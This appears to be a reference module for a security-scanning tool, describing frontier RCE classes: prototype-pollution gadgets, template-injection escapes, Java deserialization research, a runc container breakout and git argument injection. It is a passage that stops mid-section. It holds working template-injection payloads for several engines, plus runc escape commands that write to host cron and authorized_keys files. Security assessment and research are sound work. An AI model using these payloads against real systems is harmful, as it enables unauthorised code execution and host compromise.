---
name: rce-novel-deep
description: Novel and frontier RCE depth for 2024–2026 — prototype-pollution-to-RCE at runtime scale (Silent Spring, GHunter), the SSTI class-walk/constructor-chain frontier with per-engine anchors, runc Leaky Vessels container-to-host breakout, git-family argument-injection as a 2025–2026 phenomenon, Sleeping Giants Java-deserialization supply-chain reframing, and emerging-stack expressions (Deno, Nest.js, Nuxt, edge runtimes).
sibling: rce
load_when: scan_mode == "deep"
---

# RCE — Novel and Frontier Depth

This is the novel+frontier deep sibling to `rce.md`. The base owns the primary CVE anchors, the compact frontier notes (BatBadBut, git-arg-injection, Sleeping Giants brief, runc summary), and the confirmation-ladder rung descriptors; the advanced+expert sibling `rce_advanced_deep.md` owns the parser-and-OS differential depth, sub-sink matrices, ladder methodology, JEP 290/classpath depth, and composite chain playbooks. This file owns the 2024–2026 published-instance frontier — runtime-scale gadget catalogs with per-impact tables, per-engine class-walk anchors, the Sleeping Giants supply-chain reframing in depth, and emerging-stack expressions — routing by filename.

Load this file when the target is on the current frontier — a Node.js 21+ application with prototype-pollution reachability, a React 19.x deployment with server components, a Jinja2 render path where sandbox vs unsandboxed is the finding, a git-hosting service or Go-based git library, a Java service where classpath composition is the load-bearing question, a container runtime that hasn't been audited for the runc/BuildKit surface, or a Deno-based service that inherits the Node-family prototype-pollution surface.

## Prototype-Pollution-to-RCE at Runtime Scale — 2023–2024 Empirical Baselines

The base file names three PP-to-RCE gadgets (child_process shell+env, require gadget A, import gadget) and delegates the source-of-pollution to `prototype_pollution`. This section is the runtime-scale gadget catalog established by two peer-reviewed papers, and the practical consequences for assessing a Node.js or Deno target in 2026.

### Silent Spring — the 11 stdlib gadget baseline (USENIX Security 2023)

Shcherbakov / Balliu / Staicu (KTH) at USENIX Security 2023 systematized the Node.js prototype-pollution → exec transition and published 11 stdlib gadgets that reach code execution or arbitrary-file access. The paper's central proof: **every command-execution API in `child_process` (`spawn`, `spawnSync`, `exec`, `execSync`, `execFileSync`, `fork`) reads from `Object.prototype.shell` and `Object.prototype.env` when the call site does not pass an explicit `options` argument**.

The `Object.prototype.env.NODE_OPTIONS = '--inspect-brk=0.0.0.0:1337'` gadget in particular is the universal transition — any subsequent Node subprocess spawn boots with the V8 inspector open on an attacker-reachable port. The paper's phrasing: "acting as a reverse shell." The mitigation the paper documents is caller-side — passing `options={shell: false, env: process.env}` explicitly at every spawn site, which the ecosystem's actual codebases don't do universally.

The 11 gadgets extend beyond `child_process`:
- `require()` gadget A — `Object.prototype.main` overrides the missing `main` field in a `package.json` and loads an attacker-chosen file when the target `require()`s a package with no `main`.
- Path-shape gadgets that reach file-read or file-write via `path.join`/`path.resolve` behavior on polluted properties.
- Cryptographic-downgrade gadgets that pollute `Object.prototype.encoding` or `Object.prototype.algorithm` to weaken a subsequent crypto operation.
- Argv-reshaping gadgets that reach `process.argv`-shape properties consumed by CLI parsers.

Full paper: https://www.usenix.org/system/files/sec23summer_432-shcherbakov-prepub.pdf. Companion GitHub repo (KTH-LangSec): https://github.com/KTH-LangSec/server-side-prototype-pollution.

### GHunter — the runtime-scale table (USENIX Security 2024)

Cornelissen / Shcherbakov / Balliu at USENIX Security 2024 (arXiv:2407.10812) extended the analysis to full runtime scale via a dynamic-taint-analysis tool. GHunter identifies **56 universal prototype-pollution gadgets in Node.js v21.0.0 and 67 in Deno v1.37.2**. The per-impact-class breakdown, per runtime (Node.js / Deno):

| Impact class | Node.js v21.0.0 | Deno v1.37.2 |
|---|---|---|
| Arbitrary Code / Command Execution | 14 | 5 |
| Privilege Escalation | 7 | 24 |
| Path Traversal | 3 | 10 |
| SSRF | 6 | 3 |
| Cryptographic Downgrade / Unauthorized Modifications / Log Pollution / Panic-Segfault / OOM / Infinite Loop / Second Order | remainder to 56 | remainder to 67 |

Two consequences the base file's compact treatment doesn't spell out:

1. **Deno inherits Node's PP surface.** Deno's stated security posture is "no unsandboxed FS/net without a permission flag" — but the 24 privilege-escalation gadgets in Deno v1.37.2 are gadgets that let a script with lower permissions reach primitives normally requiring higher permissions. PP is a *permission-model* bypass in Deno, not just an exec-shape bypass.
2. **The absolute counts extend with runtime version.** GHunter's numbers describe those exact versions; individual gadgets may be patched in newer runtime releases. The taxonomy is durable, individual gadgets rot. Match findings to the target runtime version before citing a specific gadget count.

The consequence for assessment: pollute Object.prototype, then verify any of the 14 Node.js exec-shape gadgets or 5 Deno exec-shape gadgets fires. `Object.prototype.shell` + `Object.prototype.env.NODE_OPTIONS` remains the fastest to confirm because it's universal across every `child_process` call site.

### Three `require()` / `import()` gadgets — in-process, no child_process

- **`require()` gadget A** (Silent Spring): `Object.prototype.main` is used when `require()` finds a `package.json` with no `main` field. Precondition — the target `require()`s a package that has this shape. Rare but exploitable on specific dependency trees.
- **`require()` gadget B — CVE-2023-31414** (patched Node.js v18.19.0, CVSS 9.1, exploited end-to-end in Kibana 8.7.0). When `readPackage()` misses `package.json` and returns `false`, the code path `(false)?.main` traverses `Object.prototype` because `Boolean` inherits from `Object.prototype` — a polluted `main` reaches `tryPackage()` and is loaded and evaluated. The `?.main` optional-chaining is what silently opts into the prototype-traversal semantics. The GHunter paper (§5.2) contains the Node.js source excerpts and the exact patch commit.
- **`import()` gadget** (GHunter): `Object.prototype.source` on any `.mjs` file — when `import()` inspects source metadata, polluted `source` reaches the module-code path and is evaluated as JavaScript. Primitive: in-process arbitrary JS in the Node.js runtime.

The base file's "in-process arbitrary JavaScript in the Node.js runtime" is the primitive shared across all three. Confirmation signal: the attacker JS runs in-process — file drop, callback, in-band stdout are proof rungs.

### Source-of-pollution class in modern deps (2024–2026)

The source is separate from the sink; a PP source doesn't imply RCE unless a sink is reachable, but a PP source without any sink audit is a live risk. Modern source-of-pollution classes:

- **Lodash-family merge functions** — `_.merge`, `_.mergeWith`, `_.defaultsDeep` with untrusted input recursively assign into nested objects, reaching `Object.prototype` when the input has a `__proto__` key or a `constructor.prototype` chain.
- **Body-parser and qs** — HTTP form parsers that interpret `[]` bracket syntax build nested objects from `?a[__proto__][x]=y`-shape queries. Older versions of `qs` (< 6.11.0) had this class; modern versions add key filtering.
- **Object.assign / spread on user input** — `{...userJson}` shallow-copies; `Object.assign({}, userJson)` too. Neither reaches Object.prototype directly, but a follow-up `_.merge`-shape does.
- **YAML parsers** — some YAML parsers interpret merge keys (`<<:`) with property-copy semantics; a crafted YAML with `<<: { __proto__: { x: y } }` reaches PP.

Load `prototype_pollution` for the full source class catalog and the exploit-primitive-to-source discovery methodology.

## React Server Components Pre-Auth RCE — CVE-2025-55182 Class Fingerprint

The workflow surfaced CVE-2025-55182 as a lead (Datadog Security Labs post on React2Shell) but did not primary-source-confirm the specific PP-to-exec mechanism in either research pass. NVD does confirm the CVE, its version boundary, and its class. Report the CVE with the version-fingerprint mitigation only; do not assert mechanism details that weren't primary-source-verified.

### Confirmed from NVD

- **Product**: React (`@facebook:react`), and the affected React Server Components packages (`react-server-*` variants).
- **Affected versions**: React 19.0.0, 19.1.0, 19.1.1, 19.2.0.
- **Severity**: CVSS 3.1 10.0 CRITICAL — pre-authentication remote code execution.
- **Advisory**: NVD lists the CVE; primary-source URL is the React security advisory (not primary-source-verified in the workflow, so no mechanism-claim beyond NVD's descriptor).

### The disclaimer — mechanism unverified in this pass

The Datadog Security Labs post at `securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution-react-server-components/` describes a server-side prototype-pollution → exec transition via React Server Components, but the workflow's adversarial verifier did not surface primary-source confirmation of the specific mechanism (React's own GHSA advisory or the patch commit diff). Treat the mechanism narrative as a lead, not a load-bearing claim. What the assessor should do: check whether the target uses React 19.x with RSC (`use client`, `use server` directive strings; `next/server`-shape imports). If yes and the React version is one of the affected four, the class is live regardless of the specific mechanism.

### The version-fingerprint mitigation

- Grep the package-lock: `react@19.0.0`, `react@19.1.0`, `react@19.1.1`, `react@19.2.0` and the corresponding `react-server-*` packages.
- If matched, report the finding as "React Server Components pre-auth RCE class — CVE-2025-55182 — target version fingerprint confirms the class is available; upgrade to the fixed line."
- Do not claim the specific mechanism unless primary-source-verified separately.

### The frontier consequence

React 19's Server Components add a new server-render primitive to the framework — user-controlled data that transits between server and client through the RSC "flight" payload is a new attack surface. Expect further CVE-shape work in this space through 2026. Load `frameworks/nextjs.md` for the App Router routing-and-caching surface and `xss` for the client-boundary XSS class that RSC's serialization also touches.

## SSTI Class-Walk / Constructor-Chain Frontier — 2024–2026

The base file names the canonical Python/Jinja2 class-walk chain, the sandboxed-vs-unsandboxed differential, and the JavaScript-layer constructor-chain → Function() class. This section is the frontier depth: the empirical baseline, the four CVE anchors, the sub-primitive breakdown, and the per-engine differential surface.

### TEFuzz — the empirical baseline (USENIX Security 2023)

Zhao / Zhang / Yang (Fudan) at USENIX Security 2023 published *Remote Code Execution from SSTI in the Sandbox: Automatically Detecting and Exploiting Template Escape Bugs*. TEFuzz treats sandboxed template engines as escapable-by-default and finds working escapes at scale. Its published numbers: **135 previously-unknown template-escape bugs across 7 PHP template engines** (Twig, Smarty, Latte, Twig-based variants), with **auto-synthesized working RCE exploits for 55 of them**.

The paper's central framing: "By escaping the template rendering process, template escape bugs can be used to inject executable code on the server side." The assessor consequence — do not accept "the target uses a sandboxed template engine" as closing the SSTI class. The sandbox is a mitigation shape, not a boundary; escape rates in the wild are non-trivial.

### The unsandboxed Jinja2 class-walk — two 2026 CVE anchors

Applications rendering user-controlled template text through the default `jinja2.Environment` (no sandbox) or `Template(content).render()` (also no sandbox) expose the class-walk chain immediately. The canonical form:

```
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[<n>]('id', shell=True, stdout=-1).communicate() }}
```

Any object reachable from the template scope carries the class-walk to `__globals__` and thence to `os`; the specific object (`lipsum`, `cycler`, `self`, or a passed variable) doesn't matter as long as `is_safe_attribute` isn't blocking `__`-prefixed access.

Two 2026 CVEs anchor the class:

- **CVE-2026-27961 (Agenta ≤ 0.86.7, CVSS 8.8, fixed 0.86.8)**: renders user-supplied template text through unsandboxed `Template(content).render()` at `sdk/agenta/sdk/workflows/handlers.py:283` and `sdk/agenta/sdk/types.py:715` when `template_format=jinja2`. The published advisory attack vector is `{{ lipsum.__globals__['os'].popen('id').read() }}`. Primitive: arbitrary Python execution in the Agenta API server process. Confirmation: template output reflects `id` output in-band.
- **CVE-2026-31864 (JumpServer ≤ 3.10.21 / ≤ 4.10.15, CVSS 6.8, fixed 3.10.22 / 4.10.16, PR #16608)**: uses `Environment()` in `apps/common/utils/yml.py::yaml_load_with_i18n()` to render a user-uploaded manifest.yml. Attack vector: `{{ self.__init__.__globals__.__builtins__['__import__']('os').popen('id').read() }}`. Primitive: arbitrary Python execution in the JumpServer Core container.

The sandboxed-vs-unsandboxed differential is a grep — `SandboxedEnvironment` vs `Environment` on the render path. The `SandboxedEnvironment` blocks `__`-prefixed attribute access via `is_safe_attribute`; the plain `Environment` does not. Miss the sandbox marker and the finding is available; miss the `is_safe_attribute` check and the finding is available even in the sandboxed shape (see the TEFuzz baseline — sandbox is escapable).

### JavaScript-layer escape via `constructor.constructor` → `Function()`

ECMA-262 `Function(str)` compiles its argument as code; any expression language that exposes property access over user objects walks `x.constructor.constructor(...)` to `Function`:

- **CVE-2024-55652 (pwndoc, fixed 1.0.0, commit 1d4219c596f4f518798492e48386a20c6e9a2fe6)**: a custom `select` filter fetched arbitrary `attr` properties of an `input` variable without prototype-chain restriction. Exploitation primitive: `{{ ([1337] | select: 'constructor' | select: 'constructor')[0](...) }}` chains property access via `constructor` fields to the Function() constructor, which compiles a string argument as code. The published PoC base64-decodes to `process.binding('spawn_sync').spawn({file:'/bin/sh', args:['sh','-c','id'], ...}).output.toString()` — the target's `id` output reflects in the rendered template.

- **CVE-2026-23830 (SandboxJS, GHSA-wxhw-j4hc-fmq6)** confirms the primitive is still exploited wherever property access is unrestricted. The class fingerprint is any expression evaluator that exposes `constructor` on user-visible values.

The differential across sandbox libraries: `SandboxJS`, `vm2` (deprecated), Node's `vm` module — each has documented sandbox-escape research; the sandbox is a moving target, not a boundary. `vm2` was deprecated in 2023 after successive escape classes; targets still using it are structurally vulnerable.

### The angular-1.x historical parallel

The AngularJS 1.x expression-sandbox escape class (Cure53 / PortSwigger Research / Angular.js #14939) established the constructor-chain shape as an XSS primitive under CSP-strict deployments. Removing the sandbox in Angular 1.6 meant any `{{}}` interpolation of user input is direct execution — every subsequent JS-layer expression sandbox has faced the same class of escape. When you see any expression evaluator over user-influenced objects in 2026, assume a constructor-chain escape is available and search for it.

## Java Deserialization Sleeping Giants — 2025 Supply-Chain Reframing

The base file's compact reframe: gadget-chain reachability is a supply-chain property that fluctuates over a dependency's history; "app doesn't call the gadget" is not a mitigation. This section is the depth on the paper, the three modification patterns, and the assessment consequences.

### The empirical result

Kreyssig / Houy / Riom / Bartel published *Sleeping Giants — Activating Dormant Java Deserialization Gadget Chains* at ACM CCS 2025 (arXiv:2504.20485, https://dl.acm.org/doi/10.1145/3719027.3765031). The study applied three code-modification patterns to 533 Maven dependencies against three deserialization gadget detectors (Tabby, Crystallizer, AndroChain) and produced new detections in **26.08%** of the 533 dependencies. Manual verification of the new detections confirmed dormant gadget chains in **53 dependencies**, with **49.06% of true positives requiring only one modification pattern** applied to activate.

The paper's own framing (verbatim from the abstract): "Specifically, we show that class serializability is a strongly fluctuating property over a dependency's evolution."

### The three modification patterns

- **Transitive Serializability** — Class A `implements Serializable`; class B (used by A) doesn't. Making B `implements Serializable` doesn't change A, but transitively enables new chains through B. Consequence: adding `implements Serializable` to a utility class in a minor release can activate a chain a downstream dependency owns.
- **Final Properties** — A gadget chain needs a mutable field to reach the next hop. A dependency history that makes a field `final` closes the chain; removing `final` in a later revision re-opens it. Consequence: version-to-version semver diffs on library APIs can activate chains.
- **Interface Method Reachability** — A gadget chain needs a method reachable via the runtime type-dispatch. An interface method added in one release that a serializable class overrides in a later release closes the loop.

The 49.06% single-pattern figure is the practical consequence — most dormant chains don't need a complex chain of changes; one modification pattern applied to one class is enough.

### The assessment consequence

- **"The app doesn't call the gadget class" is not a defense.** Chain construction is constrained only by classpath composition — transitively-included libraries that the app never invokes are gadget sources.
- **Version-freshness matters.** A dependency's history is what changes reachability; a stale version may have a chain that a fresher version closed, or vice versa.
- **Runtime polymorphism is the majority pattern in publicly-known chains.** Sleeping Giants counts 22 of 34 ysoserial payloads relying on trampoline gadgets (`Object.hashCode()`, `Runnable.run()`, `Comparable.compareTo()`) — dynamic method dispatch at deserialization time, not an explicitly-called sink visible to naive static analysis. This is the mechanism behind why classpath-only static analysis over-reports (Class Hierarchy Analysis follows every reachable override) and pointer analysis under-reports (cannot capture deserialized objects at all). Use the hedged "majority pattern" framing; do not assert "dominated" or "overwhelmingly."

Load `insecure_deserialization` for the general gadget-chain catalog and `rce_advanced_deep` for the JEP 290 / classpath / module-boundary depth.

### The trampoline gadget class — the majority mechanism

Sleeping Giants counts **22 of 34 ysoserial payloads** relying on trampoline gadgets — the paper's finding motivates the class as the majority pattern in publicly-known chains (hedged framing per §0). The trampoline shapes:

- **`Object.hashCode()`** — deserialized `HashMap`/`Hashtable`/`HashSet` compute hash codes on `readObject`. Any serializable class whose `hashCode()` override does interesting work becomes a trampoline. `URL.hashCode` (the URLDNS trampoline) is the simplest; `CommonsCollections`-family chains use trampoline into `AbstractInvocationHandler.invoke`.
- **`Runnable.run()` / `Callable.call()`** — deserialized `Thread`/`FutureTask` and adjacent classes may invoke `run()` on deserialized members. Classes whose `run()` override reaches a sink become the trampoline entry.
- **`Comparable.compareTo(Object)`** — deserialized `TreeMap`/`TreeSet` invoke `compareTo` on entries. Classes whose `compareTo()` override reaches a sink are trampoline candidates.
- **`Iterator.next()`** and iterator-shape overrides — some deserialization paths iterate deserialized collections.

The static-analysis consequence the paper documents: Class Hierarchy Analysis (CHA) follows every reachable override, over-reporting because most overrides don't reach RCE; pointer analysis under-reports because it can't capture *deserialized* objects (they don't exist at analysis time). Runtime-polymorphism-aware analysis is what current research (Sleeping Giants, FLASH USENIX 2025) targets to close the gap. For the assessor: the "does the app call this method?" question is not the load-bearing one; "does the classpath admit a serializable class whose method-override-graph reaches a sink via trampoline dispatch?" is.

### JEP 290 working-through — real examples

The base file and advanced deep note that `ObjectInputFilter` is a mitigation, not a refutation. Concrete working-through patterns from the assessor's perspective:

- **The application-package-only filter**: `jdk.serialFilter = com.myapp.*;!*`. This allows deserialization of only application-package classes. If the app's own serializable classes have `readObject`-callable methods that reach `ClassLoader.defineClass` or `MethodHandle.invoke` (rare but documented in a few 2023 CVEs), the chain goes through the app's own code, not a library gadget. Grep the app's serializable classes for `defineClass`, `getResource`, `MethodHandle`, `Unsafe`.
- **The permissive filter**: `jdk.serialFilter = *`. Doesn't filter anything; classpath composition alone constrains chains. Common in legacy migrations to newer JDKs.
- **The class-count-limit filter**: `jdk.serialFilter = maxarray=10000;maxdepth=10;maxrefs=100;!*`. Attackers hit these limits with high-fan-out gadgets. Detection: send a payload deliberately exceeding one limit; the response error class fingerprints the filter.

The 2024–2026 landscape continues to see JVM RCE via classpath-composition; the specific chain is version-and-classpath-dependent, but the class doesn't close.

## runc Leaky Vessels — CVE-2024-21626 in Depth

The base file's compact treatment names the mechanism (Dockerfile WORKDIR = /proc/self/fd/<n>) and the two delivery vectors. This section is the operational depth.

### The mechanism (verbatim from the runc GHSA and Red Hat RHSB-2024-001)

**GHSA-xr7r-f8xq-vfvv** (opencontainers/runc): runc leaks host-side directory file descriptors into `runc init`. The container's OCI `process.cwd` (set via the Dockerfile `WORKDIR` directive or the `docker run --workdir` flag) is `chdir()`ed into by runc *before* closing the leaked fds. If `process.cwd` points at `/proc/self/fd/<n>` where `<n>` is a leaked host-directory fd, runc's `chdir()` moves into that host directory — and runc does *not* verify the final working directory is inside the container mount namespace. The container's pid 1 boots with a working directory in the host mount namespace.

- **Primitive (i) — host-file read**: `cat ../etc/shadow` (or absolute `cat /host/etc/shadow` if the leaked fd was `/`), reachable from inside the container.
- **Primitive (ii) — host-file write**: `echo '...' > ../etc/cron.d/0hack`, `echo '...' >> ../root/.ssh/authorized_keys`. Host cron picks up the write; host sshd honors the added key on next connection.

### The two delivery vectors

- **Malicious image build/run**: the attacker's Dockerfile contains `WORKDIR /proc/self/fd/8` (or another number identified by observing runc's fd table). The victim `docker run`s the image; runc initializes the container with the malicious WORKDIR; the container has an escape by construction. Requires the victim to run a malicious image, so relevant for CI/CD pipelines that pull user-submitted images, container registries with typosquat threats, and multi-tenant build systems.
- **`runc exec` from inside a running container**: an attacker with in-container shell (from any prior RCE) can call `runc exec --process=/tmp/spec.json <container>` with a process specification whose `cwd` is the malicious `/proc/self/fd/<n>`. runc's `exec` code path shares the fd-leak class. Requires the attacker to already be inside a container — but the escape from container to host is via this second delivery, not a fresh compromise.

### The confirmation signal

From inside the container, after the `chdir()`:

```
readlink -f .          # if not the expected container-relative cwd, escape confirmed
ls ..                  # if listing shows host-namespace files, escape confirmed
cat ../etc/hostname     # target host's hostname != container's — escape confirmed
```

### The patch and version boundary

- Fixed in **runc 1.1.12**. Any runc `< 1.1.12` deployed on any Docker/containerd/CRI-O host inherits the class.
- Docker Engine ships its own bundled runc; check `docker info | grep 'runc version'` or `runc --version`. Long-tail deployments — Kubernetes clusters running older container runtimes, CI/CD runners with pinned Docker versions — are commonly affected in 2026.

### The BuildKit surface — refuted in this pass, but a related class

The workflow's original claim that "the Leaky Vessels disclosure bundles four CVEs — CVE-2024-21626 (runc), CVE-2024-23651 (BuildKit mount-cache race), CVE-2024-23652 (BuildKit teardown arbitrary delete), CVE-2024-23653 (BuildKit GRPC SecurityMode privilege check)" was actively refuted 0-3 in the second research pass — the three BuildKit CVEs were not primary-source-confirmed as sharing the same downstream primitive as runc CVE-2024-21626. They exist and their NVD JSON is persisted, but the "same class as runc" claim did not carry. Treat BuildKit CVEs as adjacent — an active surface worth independent research — not as an automatic extension of the Leaky Vessels primitive.

### Kernel-side sibling — CVE-2024-1086

**CVE-2024-1086** (Linux kernel netfilter nf_tables, CVSS 7.8): use-after-free in `nft_verdict_init()` allows local privilege escalation to root. Once you're inside a container with a runc/BuildKit-shape breakout to the host (or a docker.sock/K8s hostPath escape), a kernel LPE turns host-user-code into host-root. The class is distinct — a kernel bug reachable from host userspace, not a container-runtime bug — but the composite chain (container RCE → host user shell via runc → kernel LPE via nftables) is a documented end-to-end path in 2024. Load `rce_advanced_deep` for the container-to-cluster escalation ladder framework.

## Git-Family Argument-Injection Sub-Sink Class — 2025–2026 Phenomenon

The base file and advanced deep both cover CVE-2025-21613 (go-git file://) and CVE-2026-52806 (Gogs --exec) as anchors. This section is the class-as-phenomenon depth: why 2025–2026 specifically, the successor CVE-2026-45570 that closes go-git's SSH-transport sibling, and the generalization to other tool families.

### Why the class surged in 2025–2026

The primitive is old — argument injection into git-family flags with documented shell sub-sinks has been possible since git shipped `--exec`. What's new in 2025–2026:

- **Language-native git implementations reached production maturity**. `go-git` is used by Docker Buildx, kubernetes/*, and many Go CLIs; `libgit2`-based Go bindings the same. Once a language-native git can execute a git binary as fallback (go-git's file:// transport does), it inherits git's argument-injection surface.
- **Managed git-hosting services (Gogs, Gitea, Gitiles) expose git commands to authenticated users via web APIs**. Web-form input reaches git argv positions with less filtering than the direct CLI would apply.
- **Modern language argument-parsing conventions defaulted to accepting `-`-prefixed inputs**. Older CLI conventions treated a leading `-` as a flag by default; modern web-service conventions treat it as a value. The mismatch means an "unfiltered" web input reaches the CLI as a flag.

### CVE-2025-21613 and CVE-2026-45570 — the go-git two-step

- **CVE-2025-21613** (< 5.13.0, CVSS 9.8, CWE-88): file:// transport argv injection via URL. Attacker-controlled URL → arbitrary git-upload-pack flags → RCE when a flag reaches a shell sub-sink. The fix in 5.13.0 filtered URL argv positions for the file:// transport.
- **CVE-2026-45570** (< 5.19.1, CVSS 9.6): the same class in the SSH transport — go-git's SSH transport constructs the remote exec command by wrapping the URL argv, and an unfiltered URL reaches SSH argv positions. The fix in 5.19.1 filtered SSH-transport argv positions. The `-45570` sibling is the successor pattern — closing one transport doesn't close the class; the next transport with the same shape is available.

Both CVEs' fixes are argv-position filters (accept-list of URL shapes that can't be argv-prefix-abused). Neither closes the general class — a future transport addition with argv-passing behavior would need its own filter.

### CVE-2026-52806 — the Gogs direct-RCE via documented sub-sink

Gogs < 0.14.3, CVSS 9.9: an unprotected branch name in a pull-request creation flow reaches `git rebase --quiet <base> <head>` at `internal/database/pull.go:282`. A branch name of the form `--exec=<cmd>` is interpreted as git's `--exec` flag. `git rebase --exec` is *documented* to invoke its argument via `sh -c` after every replayed commit — the promotion is direct, not option-confusion.

The published PoC uses `${IFS}` to work around the space-in-branch-name limitation — git's branch-name validation refuses spaces in some contexts, so the payload uses shell field-splitting.

The fix combined `git rebase`'s own `--end-of-options` flag with an input-level rejection of branch names starting with `-`. Note: the general-class transferable mitigation "`--` end-of-options plus dash-prefix rejection" is the pattern this fix uses — but per-tool support for `--end-of-options` is not universal (see `rce_advanced_deep` for the per-tool matrix); do not report it as the general class fix.

### The generalization — other tool families with documented sub-sinks

The class shape — attacker-controlled string → argv position → documented sub-sink that calls a shell — extends beyond git:

- **ffmpeg**: `-i concat:file1|file2` with `protocol_whitelist file,http,pipe` reaches a shell-adjacent path if the concat manifest lists `pipe:`-scheme entries.
- **rsync**: `-e '<cmd>'` names the remote-shell transport; historically abused via `rsync -e 'sh -c "id"' user@host:` where the URL argv is attacker-controlled.
- **curl**: `--config /dev/stdin` re-parses new curl options from input; combined with a file-write primitive, reaches an option-injection second-order class.
- **tar**: `--use-compress-program=<cmd>` runs an arbitrary command as the compress filter. GNU tar honors this in most invocation contexts.
- **ImageMagick**: delegate policies with attacker-influenced substrings; the ImageTragick class (CVE-2016-3714) is the same shape.

Every tool with a `--exec`-shape or `--config`-shape flag is a candidate; grep the target's argv construction for tool invocations whose flags include documented sub-sinks. Load `rce_advanced_deep` for the per-tool sub-sink matrix and `argument_injection` for the general option-smuggling methodology.

## SSTI Per-Engine Tour — 2024–2026 Class-Walk Analogues

The base file's canonical Python/Jinja2 class-walk and the JavaScript constructor-chain cover the two most-frequent frontier expressions. This section is the per-engine detail — same class, different engine expression — for the engines an assessor encounters in 2024–2026 targets.

### Jinja2 — Python

Covered in depth above (unsandboxed `Environment` vs `SandboxedEnvironment`, two 2026 CVE anchors, class-walk via `__globals__` → `os.popen`). The sandboxed-vs-unsandboxed differential is a grep. The escape from the sandbox (per TEFuzz's baseline) is that even `SandboxedEnvironment`'s `is_safe_attribute` filter is a moving-target blocklist — new attribute-shape reaches can bypass it in specific dependency-version combinations.

### Twig — PHP

Twig ships a sandbox extension (`Twig\Extension\SandboxExtension`) that filters tag names, function names, method calls, and property accesses. The class-walk analogue reaches `App::` (Twig's own runtime) or Symfony's `Container::get`:

- Fingerprint: `{{ 7*'7' }}` returns `'7777777'` (string repetition) — distinguishes Twig from Jinja2 which errors on the same expression.
- Sandbox-escape shapes: methods on standard-library-shape objects (`String::replace`, `String::split`) that the sandbox blocklist may miss when the sandbox is initialized with `AllowedMethods` looser than expected.
- Direct RCE class (unsandboxed): `{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}` — reaches `system('id')` via Twig's own filter registration.
- Framework-specific: Symfony's Twig integration exposes `app.session`, `app.request`, `app.user` — reachable via `{{ app.request.server.get('...') }}` for env exfil. Not RCE per se, but useful in a chain.

### Handlebars — JavaScript

Handlebars' pre-4.0 versions had a documented sandbox-escape class via `this.constructor.constructor(...)` reaching `Function`. Post-4.0 versions restricted `helperMissing` and `blockHelperMissing` to close the direct path, but the JavaScript-layer `constructor.constructor` primitive still applies where the app registers unrestricted helpers.

- Fingerprint: `{{#with 7 }}{{ this }}{{/with}}` reflects `7` — distinguishes Handlebars from Mustache which errors on `with`.
- Escape shape: `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}` — an infamous published payload class that abuses the `SafeString.prototype` chain.

### ERB — Ruby

ERB is Ruby's default template engine. Non-sandboxed by design; user-controlled template text is direct Ruby execution. Fingerprint: `<%= 7*7 %>` reflects `49`. RCE: `<%= system('id') %>`, `<%= `id` %>`, `<%= IO.popen('id').read %>`. There is no sandbox to escape — the class is available immediately wherever ERB renders user template text. Common misuses: admin dashboards that let admins edit email/report templates rendered by ERB.

### Freemarker — Java/Kotlin

Freemarker sandboxes via `TemplateClassResolver` (default: `TemplateClassResolver.UNRESTRICTED_RESOLVER` in older releases, `SAFER_RESOLVER` in newer). The class-walk reaches Java classes via built-in-string `?new`:

- Escape: `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }` — reaches `freemarker.template.utility.Execute` and calls it with the command string. Fixed by restricting `?new` to safe classes.
- Fingerprint: `${7*7}` reflects `49`. Distinguishes Freemarker from Velocity which uses `#set($x = 7 * 7)$x`.
- Post-2.3.30 defenses: `TemplateClassResolver.SAFER_RESOLVER` refuses `freemarker.template.utility.Execute`; targets pinned to older releases (or explicitly using `UNRESTRICTED_RESOLVER`) are still exploitable.

### Velocity — Java

Apache Velocity's class-walk reaches Java classes via `$class.forName`:

- Fingerprint: `#set($x = 7 * 7)$x` reflects `49`.
- Escape: `#set($str=$class.inspect("java.lang.Runtime").type)#set($rt=$str.getMethod("getRuntime").invoke(null))#set($proc=$rt.exec("id"))$proc.getInputStream()` — reaches `Runtime.exec`. Fixed in newer Velocity by removing `.class.inspect`; older releases carry the class.
- Struts-family targets ship Velocity; check `META-INF/velocity-*.jar` for the version.

### Thymeleaf — Java/SpringEL

Thymeleaf's SpringEL surface is a distinct expression evaluator. `${T(java.lang.Runtime).getRuntime().exec('id')}` reaches Java `Runtime` if the template context resolves `T(...)` to Java class references. Thymeleaf 3.0's `SpringELExpressionParser` restricts this by default; targets configured with `enableSpelCompilation=false` or using older Thymeleaf carry the class.

### Node.js template engines (Nunjucks, Pug/Jade)

- **Nunjucks** — Mozilla's Jinja2-inspired engine for JS. Class-walk analogue: `{{ range.constructor("return process")().mainModule.require("child_process").execSync("id") }}` reaches `child_process` via the JavaScript layer.
- **Pug/Jade** — allows `- var x = eval("..."); ` mixed with template — an unsandboxed `eval` sink where user template text is direct code.

The per-engine differential: each engine's class-walk targets a different runtime-native construct (`os.popen`, `system`, `Function`, `Runtime.exec`, `child_process`). The primitive is the same across engines — arbitrary code in the render process — the specific chain differs. Load `ssti` for the engine catalog and probe-payload set.

## Second-Order Argument Injection — Class Depth

The advanced deep file names second-order argument-injection as a class: a first flag opens a configuration surface reading a file whose contents include additional flags. This section is the frontier depth on how such chains land in 2024–2026 codebases.

### The class shape

Level 1 (direct argument-injection): attacker string reaches argv position of tool T, invokes flag `--config <file>` or `-c <file>`.

Level 2 (file content controls level-1-flag): attacker also controls the contents of `<file>`. The file's contents specify additional flags — including flags with shell-invoking sub-sinks not reachable at level 1.

Level 3 (nested): the level-2 flag opens another configuration surface, level-3 flags reach a further tool with a shell sub-sink.

### Concrete 2024–2026 shapes

- **`git -c include.path=<path>`** reads an INI config with directives including `[core] sshCommand=<cmd>`. If the attacker controls `<path>`'s contents, the `sshCommand` is under attacker control — a level-2 chain reaches SSH-transport RCE.
